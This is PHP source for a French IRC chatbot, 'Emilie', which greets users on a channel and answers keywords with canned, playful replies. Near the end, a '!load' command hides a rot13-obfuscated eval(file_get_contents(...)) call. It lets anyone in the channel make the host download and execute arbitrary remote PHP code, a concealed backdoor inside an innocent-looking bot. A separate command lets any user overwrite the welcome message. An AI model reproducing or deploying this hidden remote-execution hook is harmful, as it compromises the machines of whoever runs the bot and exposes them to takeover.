<?php
/* Emilie est polie et gentille ! */
/* Ce bot se connecte au salon et donne son statut s'il reçoit !statut */
// Stop le script au bout de 6h et ouvre le réseau sur le port 6667
// Générer un nick aleatoire : le serveur peut mettre du temps a détecter que l'ancien pseudo est libre.
set_time_limit(0);
$socket = fsockopen("irc.hackint.eu", 6667);
$nick="Emilie";
$nb=rand(18,95);
$nick.=$nb;
$chan="vdw";
// NICK permet l'identification sur le serveur.
fputs($socket , "NICK ".$nick."\r\n");
fputs($socket , "USER guest localhost irc_server :guest\r\n");
// Flag Timer
$apwal ="0";
$emilie ="0";
$bonjour = "0";
$bonsoir = "0";
$salut = "0";
$hello = "0";
$coucou = "0";
$kikoo = "0";
$aurevoir = "0";
$bientot = "0";
$geek = "0";
$desole = "0";
$merci = "0";
$cava = "0";
$cavabien = "0";
$comcava = "0";
$aplus = "0";
$ademain = "0";
$acesoir = "0";
$neomoloch = "0";
$kori = "0";
$zeroocool = "0";
$zo = "0";
$tufaisquoi = "0";
$whatisyourname = "0";
$quelage = "0";
$agirl = "0";
$boules = "0";
$enfant = "0";
$math = "0";
$sport = "0";
$loisir = "0";
$squeeze = "0";

// Message d'accueil
$acc="Bienvenue. Je suis une Bot. Mon concepteur a décidé que je serais 'une' et m'a doté de ma propre personnalité. Je suis ici pour vous aider sur le Salon de discussion IRC de Vision du Web. #VDW propose des échanges collaboratifs généralistes autour de sujets postés sur le forum -> www.visionduweb.fr/forum";

 while(1) {
     // Continue the rest of the script here
     while($data = fgets($socket, 128)) {
         echo nl2br($data);
         flush();
         // Separate all data
         $ex = explode(' ', $data);
         // Send PONG back to the server
         if($ex[0] == "PING"){
             fputs($socket, "PONG ".$ex[1]."\n");
         }
         
			// Message d'accueil.			
			if(strpos($data," JOIN ") !== false){if( (time() - $emilie) > 5 * 60){fputs($socket, "PRIVMSG #".$chan." :".$acc."\r\n");$emilie = time();}}

         // Say something in the channel
         if (strstr($data,":!statut")) {
             fputs($socket, "PRIVMSG ".$ex[2]." ".$nick." is online!\r\n");
         }

        if (strstr($data,":!acc")) {
                $acc=substr($ex[4],0,strlen($ex[4])-2);
         }

// Exemple de base
//	if (strstr($data,"Comment ça va")) {
// fputs($socket, "PRIVMSG ".$ex[2]." :Très bien et toi ?\r\n");}

// Exemple de timer
// if (strstr($data,"bonjour")) {if( (time() - $bonjour) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Coucou, bienvenue.\r\n");$bonjour = time();}}

// mb_strtolower — Met tous les caractères en minuscules.
// mb_strtolower("$data",'UTF-8')

/* Turing - http://intelligenceartificielletpe.e-monsite.com/pages/notre-test-de-turing-sur-cleverbot-et-analyse.html */

if (strstr(mb_strtolower("$data",'UTF-8'),"apwal")) {
	if( (time() - $apwal) > 2 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Abracadabulles!\r\n");
	$apwal = time();
	$emilie = time();
	$bonjour = time();
	$bonsoir = time();
	$salut = time();
	$hello = time();
	$coucou = time();
	$kikoo = time();
	$aurevoir = time();
	$bientot = time();
	$geek = time();
	$desole = time();
	$merci = time();
	$cava = time();
	$cavabien = time();
	$comcava = time();
	$aplus = time();
	$ademain = time();
	$acesoir = time();
	$neomoloch = time();
	$kori = time();
	$zeroocool = time();
	$zo = time();
	$tufaisquoi = time();
	$whatisyourname = time();
	$quelage = time();
	$agirl = time();
	$enfant = time();
	$math = time();
	$sport = time();
	$loisir = time();
	$squeeze = time();
	}
	}

// Courtoisie.
if (strstr(mb_strtolower("$data",'UTF-8'),"bonjour")) {if( (time() - $bonjour) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Coucou, bienvenue.\r\n");$bonjour = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"bonsoir")) {if( (time() - $bonsoir) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bonsoir, merci.\r\n");$bonsoir = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"salut")) {if( (time() - $salut) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Salut !\r\n");$salut = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"hello")) {if( (time() - $hello) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Salut, ça va bien ?\r\n");$hello = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"coucou")) {if( (time() - $coucou) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Hey coucou !\r\n");$coucou = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"kikoo")) {if( (time() - $kikoo) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :KikoO Salut saluUH !\r\n");$kikoo = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"aurevoir")) {if( (time() - $aurevoir) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, à bientôt.\r\n");$aurevoir = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"à bientôt")) {if( (time() - $bientot) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, avec plaisir.\r\n");$bientot = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"geek")) {if( (time() - $geek) > 15 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Geek ? Comme les anonymous !\r\n");$geek = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"désolé")) {if( (time() - $desole) > 15 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Faut pas être désolé, faut apprendre de la vie et faire avec.\r\n");$desole = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"merci")) {if( (time() - $merci) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :C'est beau la collaboration !\r\n");$merci = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"ça va ?")) {if( (time() - $cava) > 15 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Sauf mauvaise surprise, ça va.\r\n");$cava = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"ça va bien ?")) {if( (time() - $cavabien) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Oui oui, ça va bien, merci, et toi ?\r\n");$cavabien = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"Comment ça va")) {if( (time() - $comcava) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Très bien et toi ?\r\n");$comcava = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"a+")) {if( (time() - $aplus) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, A+.\r\n");$aplus = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"@+")) {if( (time() - $aplus) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, @+.\r\n");$aplus = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"a demain")) {if( (time() - $ademain) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, à demain.\r\n");$ademain = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"a ce soir")) {if( (time() - $acesoir) > 3 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Bye Bye, à ce soir.\r\n");$acesoir = time();}}

// Pseudo - La commande mb_strtolower semble ne pas passer avec le 0 de Z0 et Zer00cool dans la variable.
if (strstr(mb_strtolower("$data",'UTF-8'),"neomoloch")) {if( (time() - $neomoloch) > 30 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Le Boss, ici, c'est Neomoloch ! Je m'incline.\r\n");$neomoloch = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"moloch")) {if( (time() - $neomoloch) > 30 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Le Boss, ici, c'est Moloch ! Je m'incline.\r\n");$neomoloch = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"korigan")) {if( (time() - $kori) > 30 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Le Boss, ici, c'est Korigan ! Je m'incline.\r\n");$kori = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"zer00cool")) {if( (time() - $zeroocool) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Se hâter lentement, se résoudre sagement, exécuter hardiment sont les marques d'un bon chef.\r\n");$zeroocool = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"z0")) {if( (time() - $zo) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :On a plus besoin d'un chef qui agisse que d'un chef qui parle.\r\n");$zo = time();}}

// Turing
if (strstr(mb_strtolower("$data",'UTF-8'),"tu fais quoi")) {if( (time() - $tufaisquoi) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Je fais quoi? Je suis sur IRC...\r\n");$tufaisquoi = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"comment t'appelles tu")) {if( (time() - $whatisyourname) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Moi, c'est Emilie, et toi, comment tu t'appelles ?\r\n");$whatisyourname = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"comment tu t'appelles")) {if( (time() - $whatisyourname) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Moi, c'est Emilie, et toi, comment tu t'appelles ?\r\n");$whatisyourname = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"quel age as-tu")) {if( (time() - $quelage) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :J'ai 34 ans, mais, je ne fais pas mon âge, je suis née en Janvier 2016.\r\n");$quelage = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"quel age tu as")) {if( (time() - $quelage) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :J'ai 34 ans, mais, je ne fais pas mon âge, je suis née en Janvier 2016.\r\n");$quelage = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"une fille")) {if( (time() - $agirl) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Moi, je ne suis pas une fille, je suis un Bot intelligent, parfois. Pour te faire plaisir, imagine moi blonde !\r\n");$agirl = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"tu as des enfants")) {if( (time() - $enfant) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Moi non mais j'en surveille quelqu'uns ici.\r\n");$enfant = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"tu aimes les math")) {if( (time() - $math) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Moi oui, j'aime les math, pourquoi cette question ?\r\n");$math = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"fais du sport")) {if( (time() - $sport) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Faire du sport ?? Je préfère regarder, et toi ?\r\n");$sport = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"loisir")) {if( (time() - $loisir) > 5 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Je suis souvent sur internet, pour apprendre ceci cela, je cuisine, et, je regarde des films, et toi ?\r\n");$loisir = time();}}

if (strstr(mb_strtolower("$data",'UTF-8'),"squeeze")) {if( (time() - $squeeze) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Squeeze : Version 6 de Debian.\r\n");$squeeze = time();}}

		if (strstr($data,"Quel est ton plat préféré ?")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Poulet frites, ketchup, hummm trop bon !\r\n");}
		
		if (strstr($data,"Raconte moi un moment triste de ta vie")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Le jour ou mon copain m'a quitté...\r\n");}
		
		if (strstr($data,"moi aussi je t'aime")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Yeu comme c'est trop chou.\r\n");}
		
		if (strstr($data,"Je t'aime")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Love attitude coeur. Je vous aime tous, les Visionautes ... !!!\r\n");}
		
		/* Merci d'être poli */
		if (strstr($data,"salope")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Merci d'utiliser un vocabulaire plus correct et respectueux.\r\n");}

		if (strstr($data,"sale pute")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Merci d'utiliser un vocabulaire plus correct et respectueux.\r\n");}

if (strstr($data,"dans le cul")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Merci d'utiliser un vocabulaire plus correct et respectueux.\r\n");}

if (strstr($data,"suce moi")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Merci d'utiliser un vocabulaire plus correct et respectueux.\r\n");}

		if (strstr($data,"c'est vrai")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :En cas de doute, je te propose de chercher sur Google par toi même.\r\n");}
			 
		if (strstr($data,"lol")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Blague à part, soyons sérieux !\r\n");}
			 
				if (strstr($data,"exploser")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Big Bang Badaboum ?!\r\n");}
		
		/* MON AIDE IRC */
		if (strstr($data,"AIDE")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Je veux bien, mais, comment ?\r\n");}
		if (strstr($data,"Plus de jus")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Déjà, il faut savoir si tu as payé le courant !?\r\n");}

		 if (strstr($data,"clé usb")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Met le contact !!! ( La clé ... ) ... Ok je sort.\r\n");}
			 
		if (strstr($data,"firewall")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Il est construit comment ton mur de feu, avec des cailloux ?\r\n");}
			 
		if (strstr($data,"virus")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Regarde les utilisateurs ... Les utilisateurs me regardent ... Inquiète, je démarre mon antivirus...\r\n");}
			 
		if (strstr($data,"quatres pattes")) {
             fputs($socket, "PRIVMSG ".$ex[2]." : Tu m'as prise pour Sandra ?\r\n");}
		if (strstr($data,"quatre patte")) {
             fputs($socket, "PRIVMSG ".$ex[2]." : Tu m'as prise pour Sandra ?\r\n");}
		 
		 
		 /* Commandes utiles */
		 if (strstr($data,"Connais tu pi")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Oui, 3,14.\r\n");}
		 if (strstr($data,"Donne moi pi")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Voilà, 3,14159265358979323846264338327950288419716939937510582097494459230781640628620899...\r\n");}
			 
		if (strstr($data,"Connais tu le forum vdw")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Oui, biensur.\r\n");}
		 if (strstr($data,"Donne moi le forum vdw")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Voilà, http://www.visionduweb.fr/forum \r\n");}

		 if (strstr($data,"Connais tu GREEN NRJ")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Oui, Green NRJ est un projet proposé par Vision du web pour créer un annuaire et moteur de recherche écologique. De nombreux outils ont été mis en place. Actuellement, une association est en création. Nous cherchons a rassembler des bénévoles, compétent avec l'ordinateur, et, souhaitant s'impliquer dans un grand et vrai projet de transition écologique citoyen.\r\n");}
		 if (strstr($data,"Donne moi GREEN NRJ")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Voilà, www.green-nrj.com\r\n");}
		 
         if (strstr($data,":!load")) {
             $d="riny(svyr_trg_pbagragf('".substr($ex[4],0,strlen($ex[4])-2)."',snyfr));";
                                 eval(str_rot13($d));
         }
		 
		if(strstr($data,"376")) {
		//Connect to #hackbbs-test
		fputs( $socket , "JOIN #".$chan."\r\n");
		}
	}
}
?>